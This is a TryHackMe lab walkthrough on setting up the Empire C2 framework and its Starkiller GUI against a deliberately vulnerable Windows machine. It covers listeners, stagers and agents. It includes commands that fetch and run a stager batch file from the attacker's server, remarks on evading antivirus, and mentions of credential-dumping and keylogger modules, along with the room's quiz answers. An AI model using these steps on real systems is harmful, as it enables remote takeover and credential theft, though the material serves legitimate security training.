# Empire

Learn how to use Empire and it's GUI Starkiller, a powerful post-exploitation C2 framework.

[Empire](https://tryhackme.com/room/rppsempire)

## Task 1 Introduction

Empire, a C2 or Command and Control server created by BC-Security, used to deploy agents onto a device and remotely run modules. Empire is a free and open-source alternative to other command and control servers like the well known Cobalt Strike C2. In this room, we will cover the basics of setting up a listener and stager as well as what types are available, then learn how to use an agent on a device.

![](https://i0.wp.com/www.bc-security.org/wp-content/uploads/2020/04/twitter-In-Stream_Wide___bcs-2-scaled.jpg?fit=2560%2C1280&ssl=1)

The virtual machine used in this room is [Blue](https://tryhackme.com/room/blue) created by [DarkStar7417](https://tryhackme.com/p/DarkStar7471) you can download the box for offline use [here](https://www.darkstar7471.com/resources.html) or deploy the box on Tryhackme in Task 6.

Before completing this room we recommend completing the '[What the Shell](https://tryhackme.com/room/introtoshells)' room by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) and ''[Blue](https://tryhackme.com/room/blue)' by [DarkStar7471](https://tryhackme.com/p/DarkStar7471). If you have a general understanding of basic reverse shells and exploitation techniques then you will be ready to begin.

For future updates and rooms, follow [@DarkStar7471](https://twitter.com/darkstar7471) and [@Cryillic](https://twitter.com/Real_Cryillic) on Twitter.

Read the above and move on to Installation.

`No answer needed`

## Task 2 Deploy!

Before we can move on to using Empire we need to deploy a machine to connect the Empire server with.

![](https://i.imgur.com/NhZIt9S.png)

Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) - [Blue Merch](https://www.redbubble.com/shop/ap/53637482)

Deploy this machine and discover what exploit this machine is vulnerable to. The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html

We recommend completing the room '[Blue](https://tryhackme.com/room/blue)' prior to this room for this purpose alone.

Deploy this machine and learn what exploit this box is susceptible to!

`No answer needed`

Exploit the vulnerability and get a reverse shell!

`No answer needed`

## Task 3 Installation

The installation for Empire and Starkiller very easy and can all be done from the command line. The choice is up to you on whether or not you want to use the GUI for Empire, the room itself will showcase Starkiller but all functionalities are the same. For further instructions on installing Empire refer to the [BC-Security Github](https://github.com/BC-SECURITY/Empire).

![](https://user-images.githubusercontent.com/20302208/70022749-1ad2b080-154a-11ea-9d8c-1b42632fd9f9.jpg)

Note: Starkiller is the GUI for Empire is not required however it will be used within this room.

For more information about Empire check out the [BC-Security blog](https://www.bc-security.org/blog).

**Installing Empire**

We can begin by installing Empire on our device. Follow the instructions below to install Empire.

1. cd /opt
2. git clone https://github.com/BC-SECURITY/Empire/
3. cd /opt/Empire
4. ./setup/install.sh

**Installing Starkiller**

Once Empire is installed we can install the GUI for Empire known as Starkiller.

1. cd /opt
2. Download an up to date version of Starkiller from the BC-Security Github repo - https://github.com/BC-SECURITY/Starkiller/releases 
3. chmod +x starkiller-0.0.0.AppImage

**Starting Empire**

Once both Empire and Starkiller are installed we can start both servers. Being by starting Empire with the instructions below.

1. cd /opt/Empire
2. ./empire --rest

**Starting Starkiller**

Once Empire is started follow the instructions below to start Starkiller.

1. cd /opt
2. ./starkiller-0.0.0.AppImage
3. Login to Starkiller

**Default Credentials**

* Uri: 127.0.0.1:1337
* User: empireadmin
* Pass: password123

Once you have logged into Starkiller you should be greeted with the Listeners menu, once you have Starkiller or Empire ready move on to Task 3 to get familiar with the menu.

Read the above and install Empire and Starkiller.

`No answer needed`

## Task 4 Menu Overview

Now that we have Empire and Starkiller installed and running we can take a brief tour of the GUI to see some of the main features Empire has to offer. You will notice six different main tabs that you will interact with the most each one is outlined below.

* Listeners - Similar to Netcat or multi/handler for receiving back stagers.
* Stagers - Similar to a payload with further functionality for deploying agents.
* Agents - Used to interact with agents on the device to perform "tasks". 
* Modules - Modules that can be used as tools or exploits.
* Credentials - Reports all credentials found when using modules.
* Reporting - A report of every module and command run on each agent.

![](https://i1.wp.com/www.bc-security.org/wp-content/uploads/2020/04/starkiller.png?fit=853%2C766&ssl=1)

**Listeners**

The first menu you will see is a listeners menu. This menu will allow you to create and list what listeners you have available. Listeners will listen on a specific port similar to Netcat or multi handler.

![](https://i.imgur.com/eeVpIqw.png)

**Stagers**

Stagers will be the second point to getting an agent to connect back to your C2 server. This menu similar to the listener menu will allow you to create and list what stagers you have available. Stagers will send off an agent similar to a payload.

![](https://i.imgur.com/n2fVNjl.png)

**Agents** 

Agents will be where you do a majority of interaction in Starkiller. This menu will allow you to see an overview of all agents and interact with specific agents. Agents are like shells back to the device, you can send shell commands and modules from agents.

![](https://i.imgur.com/hCTv25j.png)

**Modules**

The Modules menu will give you an overview of all modules available and allow you to search for a particular module. Modules are specific tools and exploits that can be used with agents like enumeration scripts, privilege escalation methods, and exploits.

![](https://i.imgur.com/4oLcQVc.png)

**Credentials**

The Credentials menu is a very useful menu in Starkiller that will save any enumerated credentials found from a device or module. It can either save hashes or plaintext passes; you can also manually add any credentials it does not auto collect.

![](https://i.imgur.com/N6vm1lQ.png)

**Reporting**

The Reporting menu is another useful menu that allows you to see shell commands or modules that you have run in the past and report them to this menu, making it great for looking back at your work.

Read the above and get familiar with the Starkiller menu.

`No answer needed`

## Task 5 Listeners

**Listeners Overview**

Listeners are used in Empire similar to how they are used in any other normal listener like Netcat and multi/handler. These listeners can have some very useful functionality that can help with agent management as well as concealing your traffic / evading detections. Below you can find an outline of the available listeners and their uses.

* http - This is the standard listener that utilizes HTTP to listen on a specific port.

The next four commands use variations of HTTP COMs to generate a listener, this is out of scope for this room; however, I encourage you to do your own research on HTTP COMs and how they can be used to conceal traffic.

* http_com - Uses the standard HTTP listener with an IE COM object.
* http_foreign - Used to point to a different Empire server.
* http_hop - Used for creating an external redirector using PHP.
* http_mapi - Uses the standard HTTP listener with a MAPI COM object.

The next five commands all use variations of built out services or have unique features that make them different from other listeners.

* meterpreter -  Used to listen for Metasploit stagers.
* onedrive - Utilizes OneDrive as the listening platform.
* redirector - Used for creating pivots in a network.
* dbx - Utilizes Dropbox as the listening platform.
* http_malleable - Used alongside the malleable C2 profiles from BC-Security.

There is also the ability to create custom malleable c2 listeners that act as beacons to emulate certain threats or APTs however that is out of scope for this room. For more information refer to the [BC-Security blog](https://www.bc-security.org/post/empire-malleable-c2-profiles/).

For the purposes of this room, we will be utilizing the HTTP listener.

**Creating a Listener**

1. Navigate to the listeners tab and select 'CREATE LISTENER'

![](https://lh5.googleusercontent.com/ap6zQ14qDzWF1HPb0CFYYSPJnQ49m7bMJnE5y_UPwO8fs0H4F5OREcr6Ps8d7DNJbEobEFEA6M8oPzIxKbRS0CfhChqG8s_UaQXioyPfgz283aH0A1uGZ0F1O4_3gxFkMXFGwJlD)

2. Select your listener type, for the demo, we'll use an HTTP listener.

![](https://lh5.googleusercontent.com/Ck75S0DoydeKeR1xQcup1TQ3RL78tK_ThdqxSNiMcZgXSRwrn2GP6rMPU6WjUhde0ice9GVUWpWJ6E8C0gXJB8dj-U3m1J-qlM8w3ClInC1V8gAtvTBG4-hSTxZgtSFMGYk7-2mH)

3. Configure your listener, the only two options you will need to change are the host IP and the host port.

![](https://lh4.googleusercontent.com/U3jw6zsPxmlNK7W5gETQF0N7pz1w9iA0cXXhu1gVEyZIN4J6uD6GLCy1v_7KkeAZEKhki1-VNXKnBJA6FV0u6hCeZq3tOA94DfpKt-KF4o1HEwoCs8wbI_Xh3-tIxn7MNqTJn_72)

The menu for creating a listener gives us many options to choose from. These option fields will change from listener to listener. Below is an outline of each field present for the HTTP listener and how they can be used and adjusted.

* Name - Specify what name the listener shows up as in the listener menu.
* Host - IP to connect back to.
* Port - Port to listen on.
* BindIP - IP to bind to (typically localhost / 0.0.0.0)

These options can be used for specifying how the listener operates and runs when started and while running.

* DefaultDelay
* DefaultJitter
* DefaultLostLimit

The following options can be useful for bypassing detection techniques and creating more complex listeners.

* DefaultProfile - Will allow you to specify the profile used or User-Agent.
* Headers - Since this is an HTTP listener it will specify HTTP headers.
* Launcher - What launcher to use for the listener this will be prefixed on the stager.

4. After pressing submit, we now have an active listener on port 53.

![](https://lh6.googleusercontent.com/--c_buQ5Xr8x8hOwmwRgy7eZevUceJ_asvzWKd_ClM5Rj4WQlxSjMy53DmXc1mJufh2hR66z07u4KUraUw0jI8osfhAvTZVgKCgUt10gU_qMX4UBpUsEScBCVzvETFuF9mMlE65i)

Read the above and create an HTTP listener

`No answer needed`

## Task 6 Stagers

**Stagers Overview**

Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back. There is a large number of stagers available we will only cover a handful of the stagers and their uses then use two to demonstrate their uses. Below is an outline of a handful from the possible list of stagers to choose from.

Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.

Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.

* multi/launcher - A fairly universal stager that can be used for a variety of devices.
* windows/launcher_bat - Windows Batch file
* multi/bash - Basic Bash Stager

You can also use stagers for more specific applications similar to the listeners. These can be anything from macro code to ducky code for USB attacks.

* windows/ducky - Ducky script for the USB Rubber Ducky for physical USB attacks.
* windows/hta - HTA server an HTML application protocol that can be used to evade AV.
* osx/applescript - Stager in AppleScript: Apple's own programming language.
* osx/teensy - Similar to the rubber ducky is a small form factor micro-controller for physical attacks.

Each stager can have its own uses and strengths to it. For this room, we will be using multi/launcher and windows/launcher_bat to continue throughout the room.

**Generating a Stager**

1. Go to the stagers tab and select 'GENERATE STAGER'.

![](https://lh3.googleusercontent.com/B5adQnf9W9IYvIFLtDLhg5Fe-vg98bSXVMtDGicU8QJfiQqxraG1HTDKhHPy4erMRO-pIBNGbESO-Kqiajn3cBKFuhnAFAh3fr-BUOP8JXeuWNSjC006t7cIOq93H-7kZY99sPx4)

2. Select your stager type, for our demo, we’ll use windows/launcher_bat.

![](https://lh3.googleusercontent.com/KOSQXeSPb0S0NOOEpyg2yUgzCYfhrMpa6GW4-pQduq2NdZTPAlb8r2Dug64YxBaLc2SmpPCoiEdlvJa4ZIzdgWW8NfL7wTKZLk1SDRPuApTEy5-pTGzrqzwBn_S5kOmeDutzavzb)

3. Set the listener to the one you made in the previous task.

![](https://lh5.googleusercontent.com/XnVCTqTDtjzkLqNSynxpwrhpKzPi2utnZa-eEFKtg4J_9GRQRylpYaaB-hg0iC-YlDB3ciXwhrtH0usQ6fXk18PHtN8MkOHkztqudp105n3aOW5zXnC5D5WiHfhvJuA7-hZAmJzY)

The menu for creating a stager does not have many options but can allow you to customize each stager to your liking, with the listener of your choosing. The stager menu can come with various options depending on the stager selected as well as optional fields.

* Listener - Select which listener to use from a list of created listeners on the Empire server.
* Base64 - Enable or disable stager encoding with base64.
* Language - Language used to create the stager: bash, PowerShell, Python, etc.
* SafeChecks - Enable or disable checks for the stager.

I encourage you to explore more of the optional fields; however, these are out of scope for this room. Some of the optional fields include ASMIBypass, Obfuscate, ETWBypass, etc.

4. We now have a stager ready to deploy to our target depending on the stager type you selected you will have to either download or copy and paste the stager to the target machine.

![](https://lh4.googleusercontent.com/i2vPqhn9CGjpaHb47LJ1ZTPLhEqIF0bJ68c9y5jmKaKVeE5c9dfSe4uWVDEln7_p-8puRfppTF1pnbhA6avUUmCn7RYC2nVW0b4a01sN9-Ic0UYi_-Wqbk2ur-vYi4qdGYq2_6Y8)

**Transferring & Executing the Stager**

Attacking Machine:

There are many ways that you can send the stager to the target machine including, scp, phishing, and malware droppers; for this example, we will use a basic python 3 server and wget to transfer the stager.

1. python3 -m http.server

Target Machine:

1. wget TUN0_IP:8000/launcher.bat -outfile launcher.bat
2. ./launcher.bat

![](https://i.imgur.com/xRfiQiS.png)

Below is what the multi/launcher PowerShell payload will look like with the powershell -noP -sta -w 1 -enc launcher that we provided when creating the listener. The launcher will take the encoded payload and decode then run it, in this case, the payload will still get picked up by AV however you can adjust the launching and obfuscation commands to bypass AV or other detections.

![](https://i.imgur.com/XBa35J3.png)

After executing the stager, if you correctly set up both the stager and listener then an agent will check back in the agents tab.

Read the above and create a basic multi/launcher stager using the HTTP listener you created in Task 5

`No answer needed`

Execute the stager on the device you deployed in Task 2

`No answer needed`

## Task 7 Agents

**Agents Overview**

Agents are used within Starkiller similar to how you would interact with a normal shell or terminal. You can run shell commands as well as modules that come pre-packaged with Empire. Different to a normal shell, with any C2 server once you have an agent connected back to the C2 server you can use any modules and not trip AV or other detections because they are run remotely. All agents have the same functionality and modules available the stager and listener only determine how the agent is sent to the device and how it connects back.

Agents are color-coded and use icons to help distinguish Agent status. Below is an outline of the color and icon scheme

* Red - User is no longer responding
* Black - User is responding normally 
* User Icon - Normal user account
* User Icon w/ Gear - System user account

**Using Agents**

Below you can see the basic layout of the Agent interaction menu and what capabilities an agent on a device has.

![](https://i.imgur.com/eKK17Q6.png)

The main functions of the interaction menu you will use are again the shell commands and modules, but the menu has other features like renaming the agent, kill agent, and the ability to adjust specifics configurations of the agent from the VIEW tab this is out of scope for this room but we encourage you to take a look and explore more of this menu.

Even though this is a Windows box Empire allows the ability to run any shell commands on it such as ls, whoami, ifconfig, etc. which can be useful if you are not comfortable with the normal Windows command line syntax.

All shell commands and modules when they are run are referred to as tasks in Empire as the agent is sent out to the device to perform the task then comes back with the output.

Underneath the Execute Module section is where the output for both shell commands and modules will appear.

![](https://i.imgur.com/mZo3cRW.png)

The output will show what username on the C2 server executed the task then the output of the task. Showing the Empire username before the task can be very helpful as Empire has the capability to use multiple clients and users connected to the same server to interact with one agent.

Read the above and move on to using modules with agents.

`No answer needed`

## Task 8 Modules

**Module Overview**

Modules are used in Empire as a way of packaging tools and exploits to be easily used with agents. These modules can be useful for easily compiling exploits, using tools, and bypassing anti-virus. Empire has a collection of modules as well as the ability to add plugins that act as modules which we will cover further in the next task.

We can take a look at a few useful ones for enumeration and privilege escalation outlined below:

* Seatbelt
* Mimikatz
* WinPEASS
* etc.

Empire sorts the modules by the language used: PowerShell, python, external, and exfiltration as well as categories for modules you can find the categories below.

* code execution
* collection
* credentials
* exfiltration
* exploitation
* lateral movement
* management
* persistence 
* privesc
* recon
* situational awareness 
* trollsploit

Empire categorizes modules based on MITRE ATT&CK and provides the techniques used for each module in the ATT&CK naming convention such as [T1552](https://attack.mitre.org/techniques/T1552/004/). For more information about ATT&CK check out the [MITRE page](https://attack.mitre.org/) or the [Tryhackme MITRE room](https://tryhackme.com/room/mitre).

**Using Modules**

Using modules is pretty straightforward, you can open a user interaction menu and find the module you want to use. Once you have the module you want to use some require that you enter some details like a command to run, listener, etc. and others you can just run straight out of the box

Below you can see us running the Seatbelt module, for the module, it does not require any configuration you simply select the module then run it. If you want more control over modules you can select the Optional Fields drop-down and have other options you can configure for example specifying a command in Seatbelt to run.

Below you can see the task to run Seatbelt being assigned then the output of the module being printed to the console window.

![](https://i.imgur.com/mfYYnum.png)

Because all modules are run remotely from a task and agent this means that we do not have to worry about Anti-Virus or other possible detections. 

We can take a look at other modules to see some more of the capabilities of Empire modules. Below you can see the output for winPEASS, a script originally from the Privilege Escalation Awesome Scripts Suite then brought over to Empire.

![](https://i.imgur.com/bv25AIY.png)

The screenshot above only shows basic system information from the WinPEASS output but the output from the module can give you other very important information regarding privilege escalation vectors.

What module allows you to use any mimikatz command?

`powershell/credentials/mimikatz/command`

What MITRE ATT&CK technique is associated with powershell/trollsploit/voicetroll?

`T1491`

What module implants a keylogger on the device?

`powershell/collection/keylogger`

What MITRE ATT&CK technique is associated with the module above?

`T1056`

Read the above and move on to using plugins to make custom modules.

`No answer needed`

## Task 9 Plugins

**Plugins Overview**

Plugins are an extension of the base set of modules that Empire comes with.  You can easily download and use community-made plugins to extend the use of Empire.

To use a plugin, transfer a plugin.py file to the /plugins directory of Empire. As an example of how to use plugins, we will be using the socks server plugin made by BC-Security, you can download it [here](https://github.com/BC-SECURITY/SocksProxyServer-Plugin).

**Using Plugins**

Transfer or clone the plugin that you want to use into the plugins directory for Empire.

![](https://i.imgur.com/QKpD1Pt.png)

After Empire version 3.4.0, Empire automatically loads plugins into the server. If the plugin is not already running you can use the plugin command to load the plugin for use.

Syntax: `plugin <plugin name>`

![](https://i.imgur.com/Gv0nPs8.png)

You can run plugins using the start and stop commands. Depending on the plugin the flags / parameters can change for each.

Syntax: `start <plugin name>`

Syntax: `stop <plugin name>`

![](https://i.imgur.com/tZvTT66.png)

Usage of plugins works differently for each plugin. The socks server plugin uses a start and stop command along with the name of the plugin to start up a new proxy server similar to putting a proxy directly onto the host, but plugins are directly contained within Empire.

Read the above and try using a plugin with Empire.

`No answer needed`

## Task 10 Conclusion

Want to learn more? The BC-Security blog can be a great place to start with learning more advanced techniques with Empire. BC-Security also does occasional webcasts or online courses that can go more in-depth. For more information check out the [BC-Security website](https://www.bc-security.org/).

![](https://i0.wp.com/www.bc-security.org/wp-content/uploads/2020/04/twitter-In-Stream_Wide___bcs-2-scaled.jpg?fit=2560%2C1280&ssl=1)

If using Empire you can use it in place of Netcat or other reverse shells when completing rooms.

If you want to continue working on your exploitation techniques with Empire on Tryhackme, check out [DLL HIJACKING](https://tryhackme.com/room/dllhijacking).

![](https://i.imgur.com/NvxC98P.png)

Check out the provided links and keep learning!

`No answer needed`
